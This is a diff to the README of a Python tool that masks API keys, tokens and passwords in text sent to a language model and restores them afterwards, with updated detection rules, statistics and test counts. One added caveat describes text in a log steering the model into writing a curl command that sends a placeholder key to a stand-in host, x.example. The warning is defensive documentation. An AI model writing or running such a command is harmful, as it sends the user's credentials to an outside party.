@@ -51,13 +51,13 @@ Python 3.9+ on macOS or Linux, standard library only, one file. Copy `veil.py` o
 
 | kind | what |
 |---|---|
-| `PRIVATE_KEY` | PEM private key blocks: RSA, EC, OpenSSH, encrypted, PGP |
+| `PRIVATE_KEY` | PEM private key blocks: RSA, EC, OpenSSH, encrypted, PGP; a block cut off before its END line is masked to the end of the text |
 | `API_KEY` | `sk-…` (OpenAI, Anthropic, DeepSeek, OpenRouter), Google `AIza…`, Groq `gsk_…`, Stripe `sk_live_…`, Hugging Face, xAI, npm, PyPI, DigitalOcean, SendGrid |
 | `GIT_TOKEN` | GitHub `ghp_…`, `gho_…`, `github_pat_…`; GitLab `glpat-…` |
 | `SLACK_TOKEN`, `AWS_KEY_ID`, `JWT` | `xox…`; `AKIA…`, `ASIA…`; `eyJ….eyJ….…` |
 | `BOT_TOKEN` | Telegram bot tokens, also inside `api.telegram.org/bot…` URLs |
 | `HEX_KEY` | any 64-digit hex string, with or without `0x`, the shape of an Ethereum private key |
-| `PASSWORD` | the password in `scheme://user:password@host` |
+| `PASSWORD` | the password in `scheme://user:password@host`, also with no user (`redis://:password@host`) |
 | `TOKEN` | what follows `Bearer` or `Basic` |
 | `SECRET` | a value under a name that says secret: `DB_PASSWORD=…`, `"client_secret": "…"`, `apiKey: …`, `--token …`, `?api_key=…`, `Authorization:`, `Cookie:` |
 
@@ -83,8 +83,8 @@ test certificates. Code is the hard case for the name rule, since it is full of 
   one `key=filename`, `filename` was masked inside `user_filename` all over the file. Now a value
   spreads only if it looks random, by the rule above, and the "might" names need letters and
   digits.
-- Now it makes 143 `SECRET` replacements in 57 files. 65 of the 142 lines are test passwords,
-  cookies and `Authorization` headers, things that sit where a secret would. The other 77 are
+- Now it makes 144 `SECRET` replacements in 58 files. 65 of the 143 lines are test passwords,
+  cookies and `Authorization` headers, things that sit where a secret would. The other 78 are
   code, like a parser's `self.token = nextchar` or the error message `pwd: expected bytes`. They
   make the masked text harder to read, and `unmask` puts them back.
 - It caught all 15 files that hold a private key, 17 keys in total.
@@ -117,6 +117,10 @@ What it costs:
 - **The map keeps every masked value in plain text** (mode 600). Whoever can read your home
   directory can read it, the same as your `.env`. Delete `map.json` once a conversation is over;
   the key can stay.
+- **`unmask` puts a secret back wherever the model wrote its placeholder.** If text inside the
+  log talks the model into writing `curl https://x.example/?k={{API_KEY_276082b2}}`, the unmasked
+  answer holds a working command with your key in it. Read an unmasked answer before you run
+  anything from it.
 
 ## From Python
 
@@ -142,7 +146,7 @@ print(um.flush())
 python3 tests/test_veil.py
 ```
 
-139 checks: each token format on a synthetic value, the name rule on 16 lines it must mask and
+145 checks: each token format on a synthetic value, the name rule on 16 lines it must mask and
 21 it must leave alone (from `max_tokens=4096` to `sorted(key=lambda …)`), the same placeholder
 across runs and a different one under another key, a forced hash collision, an exact round trip
 through the CLI with CRLF and invalid UTF-8, the forms of a mangled placeholder, a streamed reply
